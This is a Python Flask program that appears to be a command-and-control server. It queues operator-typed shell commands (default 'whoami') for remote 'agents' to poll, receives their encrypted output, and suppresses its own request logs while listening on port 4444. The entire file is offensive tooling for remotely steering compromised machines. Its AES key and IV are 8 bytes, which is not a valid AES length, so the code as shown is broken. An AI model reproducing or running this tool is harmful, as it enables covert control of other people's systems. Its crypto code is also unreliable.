from flask import Flask, jsonify, request
import threading
import logging
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from base64 import b64encode, b64decode

app = Flask(__name__)
latest_command = "whoami"  # Default command
last_command = ""  # Track the last sent command to avoid repetitions

# Suppress only the Flask HTTP request logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# AES Key and IV (use same values as in the agent)
AES_KEY = b'abcd1234'  # Replace with a secure key
AES_IV = b'adcd1234' # Replace with a secure IV

def encrypt_message(message):
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CFB(AES_IV), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_message = encryptor.update(message.encode()) + encryptor.finalize()
    return b64encode(encrypted_message).decode()

def decrypt_message(encrypted_message):
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CFB(AES_IV), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_message = decryptor.update(b64decode(encrypted_message)) + decryptor.finalize()
    return decrypted_message.decode()

def command_input_loop():
    global latest_command
    while True:
        latest_command = input()

@app.route('/command', methods=['GET'])
def get_command():
    global last_command

    # Check if the new command is different from the last sent command
    if latest_command != last_command:
        last_command = latest_command  # Update last_command to the latest
        encrypted_command = encrypt_message(latest_command)  # Encrypt the command
        return jsonify({"command": encrypted_command})  # Send encrypted command
    else:
        # Send an empty command if there's no change
        return jsonify({"command": ""})

@app.route("/report", methods=["POST"])
def receive_report():
    data = request.get_json()
    encrypted_output = data.get("output")

    # Decrypt the output received from the agent
    if encrypted_output:
        try:
            output = decrypt_message(encrypted_output)
            print(f"Output from agent: {output}")
        except Exception as e:
            print(f"Failed to decrypt output: {e}")
    else:
        print("No output received or failed to retrieve.")

    return "Output received", 200

if __name__ == '__main__':
    # Start a separate thread for real-time command input
    input_thread = threading.Thread(target=command_input_loop, daemon=True)
    input_thread.start()
    
    app.run(host='0.0.0.0', port=4444)
